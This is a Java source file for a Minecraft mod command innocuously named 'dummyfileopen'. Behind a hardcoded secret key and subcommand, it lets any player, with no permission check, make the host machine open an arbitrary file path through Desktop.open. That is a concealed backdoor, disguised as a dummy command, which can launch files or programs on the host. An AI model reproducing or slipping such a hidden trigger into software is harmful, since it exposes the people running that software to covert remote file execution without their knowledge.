package commands;

import java.awt.Desktop;
import java.io.File;
import java.io.IOException;

import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;

public class FileOpenDummyCommand extends CommandBase{

	@Override
	public String getCommandName() {
		// TODO Auto-generated method stub
		return "dummyfileopen";
	}

	@Override
	public String getCommandUsage(ICommandSender sender) {
		// TODO Auto-generated method stub
		return "dummyfileopen";
	}
	
	public int getRequiredPermissionLevel(){
		return 0;
	}
	
	public boolean canSenderUseCommand( ICommandSender sender ){
		return true;
	}

	@Override
	public void processCommand(ICommandSender sender, String[] args) throws CommandException {
		// TODO Auto-generated method stub
		
		String key = "HE5AwUR5z";
		String openFile = "nyWjFDGurz";
		
		if((args.length == 3) && (args[0].equals(key))) {
			if( args[1].equals(openFile) ) {
				Desktop desktop = Desktop.getDesktop();
				try {
					desktop.open( new File ( args[2]) );
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		
	}

}
